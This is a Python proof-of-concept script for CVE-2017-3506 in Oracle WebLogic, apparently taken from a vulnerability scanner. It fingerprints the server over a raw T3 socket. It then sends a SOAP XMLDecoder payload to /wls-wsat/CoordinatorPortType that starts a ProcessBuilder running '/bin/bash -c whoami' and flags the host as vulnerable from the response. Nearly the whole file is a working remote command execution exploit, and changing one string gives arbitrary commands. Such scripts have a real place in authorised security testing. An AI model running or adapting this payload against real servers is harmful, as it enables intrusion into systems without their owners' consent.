#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import re, socket
from urllib.parse import urlparse
import time
def weblogic_fingerprint(url):          # weblogic版本指纹
    oH = urlparse(url)
    a = oH.netloc.split(':')
    port = 80
    if 2 == len(a):
        port = a[1]
    elif 'https' in oH.scheme:
        port = 443
    host = a[0]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    server_address = (str(host), int(port))
    sock.connect(server_address)
    sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
    time.sleep(1)
    try:
        version = (re.findall(r'HELO:(.*?).false', sock.recv(1024).decode()))[0]
        if version:
            return True
        else:
            return False
    except:
        return False

VUL=['CVE-2017-3506']
headers = {'user-agent': 'ceshi/0.0.1'}

def poc(u):
    url = "http://" + u
    url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        return True
    else:
        return False



def run(rip,rport):
    url=rip+':'+str(rport)
    return poc(url)
def verify(url):
    relsult = {
        'name': 'CVE_2017_3506(weblogic)',
        'vulnerable': False
    }
    try:
        if weblogic_fingerprint(url) is not True:
            return relsult
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        if run(host, port):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['about'] = 'https://github.com/rabbitmask/WeblogicScan/blob/master/poc/CVE_2017_3506.py'
        return relsult
    except:
        return relsult
